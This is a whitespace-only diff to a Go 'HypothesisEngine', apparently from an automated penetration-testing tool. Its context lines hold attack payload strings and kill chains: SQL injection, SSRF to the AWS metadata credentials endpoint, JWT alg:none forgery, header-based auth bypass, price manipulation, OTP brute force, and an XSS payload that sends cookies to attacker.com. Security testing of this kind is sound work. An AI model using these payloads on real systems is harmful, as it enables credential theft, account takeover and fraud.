@@ -17,7 +17,7 @@ import (
 type AttackHypothesis struct {
 	ID           string    `json:"id"`
 	Title        string    `json:"title"`
-	VulnClass    string    `json:"vuln_class"`   // e.g. "SQLi", "SSRF", "BusinessLogic"
+	VulnClass    string    `json:"vuln_class"`    // e.g. "SQLi", "SSRF", "BusinessLogic"
 	Target       string    `json:"target"`        // specific endpoint/param
 	Premise      string    `json:"premise"`       // why we believe this is vulnerable
 	AttackVector string    `json:"attack_vector"` // how to exploit
@@ -208,8 +208,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "Error-based: ' OR 1=1-- ; Boolean-blind: true vs false condition comparison; Time-blind: SLEEP(5)",
 			KillChain:    []string{"Inject ' to trigger syntax error", "Confirm boolean-blind with AND 1=1 vs AND 1=2", "Enumerate information_schema", "Dump credentials table", "Crack or bypass auth"},
 			Impact:       "Full database exfiltration, authentication bypass, potential RCE via INTO OUTFILE",
-			Priority: 9, Confidence: 0.65, ZeroDayRisk: false,
-			Evidence: []string{"Database technology detected", "Numeric/string parameters in URL"},
+			Priority:     9, Confidence: 0.65, ZeroDayRisk: false,
+			Evidence:    []string{"Database technology detected", "Numeric/string parameters in URL"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -226,8 +226,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; url=http://[::]:80/; url=http://0.0.0.0/",
 			KillChain:    []string{"Identify URL parameter or webhook endpoint", "Test with http://127.0.0.1", "Escalate to http://169.254.169.254/latest/meta-data/", "Extract IAM role name", "Dump temporary AWS credentials", "Pivot to full AWS account compromise"},
 			Impact:       "Cloud credential theft → full infrastructure compromise → data breach",
-			Priority: 10, Confidence: 0.7, ZeroDayRisk: false,
-			Evidence: []string{"URL-accepting parameters detected in recon"},
+			Priority:     10, Confidence: 0.7, ZeroDayRisk: false,
+			Evidence:    []string{"URL-accepting parameters detected in recon"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -243,8 +243,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "Increment/decrement numeric IDs (id=1→id=2), swap UUIDs between sessions, test /api/users/<other-id>/data",
 			KillChain:    []string{"Create two test accounts", "Identify resource ID in API response", "Substitute other user's ID in request", "Access unauthorized PII/financial data", "Demonstrate cross-account data exfil"},
 			Impact:       "Mass PII exfiltration, account takeover, unauthorized financial data access",
-			Priority: 8, Confidence: 0.6, ZeroDayRisk: false,
-			Evidence: []string{"User/account endpoints with numeric or UUID identifiers"},
+			Priority:     8, Confidence: 0.6, ZeroDayRisk: false,
+			Evidence:    []string{"User/account endpoints with numeric or UUID identifiers"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -257,8 +257,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 		AttackVector: "X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin, X-Custom-IP-Authorization: 127.0.0.1, X-Admin: true",
 		KillChain:    []string{"Map auth-protected endpoints (/admin, /api/admin)", "Inject IP-spoofing headers", "Test role escalation headers (X-Role: admin)", "Attempt direct admin URL with X-Original-URL header"},
 		Impact:       "Authentication bypass → admin panel access → RCE or full data exfiltration",
-		Priority: 7, Confidence: 0.45, ZeroDayRisk: false,
-		Evidence: []string{"Standard web application authentication surface"},
+		Priority:     7, Confidence: 0.45, ZeroDayRisk: false,
+		Evidence:    []string{"Standard web application authentication surface"},
 		GeneratedAt: time.Now(),
 	})
 
@@ -272,8 +272,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "alg:none bypass (empty signature); RS256→HS256 confusion using public key; kid injection (kid:../../../../etc/passwd)",
 			KillChain:    []string{"Capture JWT from authenticated request", "Decode header and payload", "Set alg:none, strip signature", "Or switch to HS256 and sign with server public key", "Forge admin claims (role:admin, sub:1)"},
 			Impact:       "Complete authentication bypass → admin privilege → account takeover at scale",
-			Priority: 9, Confidence: 0.6, ZeroDayRisk: true,
-			Evidence: []string{"Bearer token / JWT in Authorization header"},
+			Priority:     9, Confidence: 0.6, ZeroDayRisk: true,
+			Evidence:    []string{"Bearer token / JWT in Authorization header"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -290,8 +290,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "quantity=-1 (negative quantity for credit), price=0.01, coupon reuse via race condition, cart total manipulation",
 			KillChain:    []string{"Identify price/quantity parameters", "Test negative values (quantity=-1)", "Test price manipulation (price=0.01)", "Test coupon parallel reuse (race condition)", "Achieve fraudulent purchase or credit"},
 			Impact:       "Financial fraud, unlimited coupon exploitation, free merchandise",
-			Priority: 8, Confidence: 0.55, ZeroDayRisk: false,
-			Evidence: []string{"Payment/e-commerce workflow detected"},
+			Priority:     8, Confidence: 0.55, ZeroDayRisk: false,
+			Evidence:    []string{"Payment/e-commerce workflow detected"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -305,8 +305,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "{__schema{types{name fields{name}}}} for schema dump; batch array of 100 queries to bypass rate limits",
 			KillChain:    []string{"Query __schema via introspection", "Map all types and mutations", "Identify sensitive mutations (login, changePassword)", "Batch 100 OTP attempts in single request", "Bypass rate limiting to bruteforce"},
 			Impact:       "Schema exposure, OTP/password bruteforce, authentication bypass",
-			Priority: 8, Confidence: 0.7, ZeroDayRisk: false,
-			Evidence: []string{"GraphQL endpoint in recon"},
+			Priority:     8, Confidence: 0.7, ZeroDayRisk: false,
+			Evidence:    []string{"GraphQL endpoint in recon"},
 			GeneratedAt: time.Now(),
 		})
 	}
@@ -322,8 +322,8 @@ func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, te
 			AttackVector: "<script>fetch('https://attacker.com?c='+document.cookie)</script>; <img src=x onerror=alert(document.domain)>",
 			KillChain:    []string{"Identify user-controlled reflection points", "Inject polyglot XSS payload", "Confirm execution in browser", "Exfiltrate session cookies to OOB server", "Replay session for account takeover"},
 			Impact:       "Session hijacking, credential theft, stored XSS → persistent backdoor in admin panel",
-			Priority: 7, Confidence: 0.5, ZeroDayRisk: false,
-			Evidence: []string{"User-controlled input fields in recon"},
+			Priority:     7, Confidence: 0.5, ZeroDayRisk: false,
+			Evidence:    []string{"User-controlled input fields in recon"},
 			GeneratedAt: time.Now(),
 		})
 	}
